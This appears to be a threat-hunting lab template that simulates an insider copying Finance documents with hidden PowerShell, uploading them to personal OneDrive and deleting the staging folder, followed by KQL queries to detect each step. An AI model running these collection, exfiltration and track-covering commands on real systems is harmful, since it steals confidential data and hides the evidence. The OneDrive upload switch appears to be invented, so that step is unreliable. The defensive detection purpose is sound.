# Threat Event (PowerShell Abuse & OneDrive Exfiltration)  
**Suspicious PowerShell Usage to Upload Files to Personal OneDrive**

## Steps the "Bad Actor" took to Create Logs and IoCs:
1. Launched PowerShell in hidden window mode to avoid alerting the user:
   ```powershell
   powershell.exe -WindowStyle Hidden
Gathered internal documents from a sensitive department folder:

powershell
Copy
Edit
Get-ChildItem "C:\Users\employee\Documents\Finance" -Recurse -Include *.xlsx,*.docx | Copy-Item -Destination "C:\Temp\exfil"
Used PowerShell to simulate a browser request to OneDrive or initiate a connection:

powershell
Copy
Edit
Invoke-WebRequest -Uri "https://onedrive.live.com/about/en-us/" -UseBasicParsing
Uploaded the collected files to OneDrive using the OneDrive sync app:

powershell
Copy
Edit
Start-Process "C:\Program Files\OneDrive\OneDrive.exe" /upload "C:\Temp\exfil"
Deleted the local exfiltration folder to cover tracks:

powershell
Copy
Edit
Remove-Item -Path "C:\Temp\exfil" -Recurse -Force
Tables Used to Detect IoCs:
Parameter	Description
Name	DeviceProcessEvents
Info	https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table
Purpose	Used to detect PowerShell usage, hidden execution, and OneDrive-related activity.

| Name | DeviceFileEvents | | Info | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table | | Purpose | Used to detect access to sensitive files and their copying to temp directories. |

| Name | DeviceNetworkEvents | | Info | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table | | Purpose | Used to detect outbound connections from PowerShell to OneDrive domains. |

Related Queries:
kql
Copy
Edit
// Detect PowerShell with hidden window flag
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-WindowStyle Hidden"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Detect copying of sensitive files from Finance folder
DeviceFileEvents
| where FolderPath has "Finance"
| where FileName endswith ".xlsx" or FileName endswith ".docx"
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine

// Detect PowerShell connection to OneDrive
DeviceNetworkEvents
| where InitiatingProcessFileName == "powershell.exe"
| where RemoteUrl has_any ("onedrive.live.com", "storage.live.com")
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessAccountName

// Detect OneDrive upload process execution
DeviceProcessEvents
| where FileName == "OneDrive.exe"
| where ProcessCommandLine contains "/upload"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
Created By:
Author Name: Your Name Here

Author Contact: Your LinkedIn or GitHub Profile

Date: April 30, 2025

Validated By:
Reviewer Name:

Reviewer Contact:

Validation Date:

Additional Notes:
PowerShell uploads to cloud services are difficult to detect unless logged or blocked at the endpoint or firewall.

Consider enabling enhanced logging and applying conditional access policies to prevent personal OneDrive access from corporate devices.

Revision History:
Version	Changes	Date	Modified By
1.0	Initial draft	April 30, 2025	Your Name

yaml
Copy
Edit
